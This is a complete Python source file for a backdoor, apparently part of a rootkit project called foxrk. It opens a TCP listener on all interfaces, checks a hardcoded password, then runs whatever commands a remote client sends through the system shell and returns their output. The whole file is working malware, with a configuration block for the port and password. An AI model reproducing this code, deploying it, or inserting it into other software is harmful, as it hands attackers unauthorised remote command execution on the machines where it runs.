#!/usr/bin/python3

# foxrk backdoor script
# by ngn13
# github.com/ngn13/foxrk

# EDIT THESE ############################
PORT  = 6767          # listening port
PWD   = "verysecure"  # backdoor password
#########################################

from os import system, environ, chdir
import threading
import socket
threadp = 0
threadb = True

def b2s(byte):
	return str(byte).replace("b'", "")[:-1].replace("\\n", "")

def run(cmd):
	system(cmd+" > /tmp/ez2918")								
        
	f = open("/tmp/ez2918", "r")
	out = f.read()
	f.close()
	
	return out			

def server(conn, addr):
	global threadp
	global threadb
		
	pwd = conn.recv(1024)
	if b2s(pwd) != PWD:
		conn.send(b"0")
		conn.close()
		threadp -= 1
		return
	conn.send(b"1")

	cmd = ""
	while cmd!="exit" and threadb:
		cmd = conn.recv(1024)
		cmd = b2s(cmd)
		if cmd == "":
			continue
		
		if cmd.startswith("cd"):
			cddir = cmd.split(" ")[1]
			chdir(cddir)
			conn.send(b"NONE")
			continue		
			
		out = run(cmd)
		if out == "":
			conn.send(b"NONE")
			continue
		
		conn.send(bytes(out, "utf-8"))

	conn.close()
	threadp -= 1

if __name__ == "__main__":
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
	try:
		s.bind(("0.0.0.0", PORT))
	except socket.error as msg:
		print(msg)
		exit() 
 
	s.listen(10)
	
	while True:
		try:
			conn, addr = s.accept()
		except KeyboardInterrupt:
			threadb = False
			s.close()
			break

		if threadp >= 10:
			conn.send(b"max")
			conn.close()
		
		if "BDDEBUG" in environ.keys():
			print("conn")				

		thread = threading.Thread(target=server, args=(conn,addr))
		thread.daemon = True
		thread.start()
